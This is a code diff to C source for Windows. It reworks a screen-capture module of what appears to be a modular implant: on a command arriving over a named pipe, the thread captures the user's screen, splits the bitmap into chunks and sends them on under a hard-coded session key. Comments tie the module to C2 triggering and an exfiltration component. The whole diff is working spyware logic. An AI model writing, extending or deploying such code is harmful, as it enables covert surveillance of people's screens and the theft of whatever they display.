@@ -70,39 +70,37 @@ DWORD WINAPI ScreenCaptureAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
 
     while (TRUE) {
-        /* Screen cap logic usually triggered by C2, we simulate an interval here */
-        Sleep(60000 * 5); /* Every 5 mins */
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                BYTE* pBmpData = NULL;
+                DWORD dwBmpSize = 0;
 
-        BYTE* pBmpData = NULL;
-        DWORD dwBmpSize = 0;
+                if (CaptureScreenToMemory(&pBmpData, &dwBmpSize)) {
+                    DWORD offset = 0;
+                    while (offset < dwBmpSize) {
+                        DWORD chunk = dwBmpSize - offset;
+                        if (chunk > MAX_IPC_PAYLOAD_SIZE) chunk = MAX_IPC_PAYLOAD_SIZE;
 
-        if (CaptureScreenToMemory(&pBmpData, &dwBmpSize)) {
-            /* 
-             * Because BMPs are extremely large (e.g. 1920x1080 * 3 bytes ~ 6MB),
-             * we absolutely must chunk it before sending over our 4KB IPC pipes.
-             */
-            
-            DWORD offset = 0;
-            while (offset < dwBmpSize) {
-                DWORD chunk = dwBmpSize - offset;
-                if (chunk > MAX_IPC_PAYLOAD_SIZE) chunk = MAX_IPC_PAYLOAD_SIZE;
+                        IPC_MESSAGE msg = { 0 };
+                        msg.CommandId = CMD_REPORT;
+                        msg.dwPayloadLen = chunk;
+                        memcpy(msg.Payload, pBmpData + offset, chunk);
 
-                IPC_MESSAGE msg = { 0 };
-                msg.CommandId = CMD_EXECUTE; /* Send to Exfil atom logic */
-                msg.dwPayloadLen = chunk;
-                memcpy(msg.Payload, pBmpData + offset, chunk);
-
-                IPC_SendMessage(hPipe, &msg, SharedSessionKey, sizeof(SharedSessionKey));
-                offset += chunk;
-                
-                Sleep(50); /* Tiny throttle to not overwhelm IPC */
+                        IPC_SendMessage(hPipe, &msg, SharedSessionKey, 16);
+                        offset += chunk;
+                        Sleep(1);
+                    }
+                    if (pBmpData) HeapFree(GetProcessHeap(), 0, pBmpData);
+                }
             }
-
-            HeapFree(GetProcessHeap(), 0, pBmpData);
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
         }
+        Sleep(500);
     }
     return 0;
 }
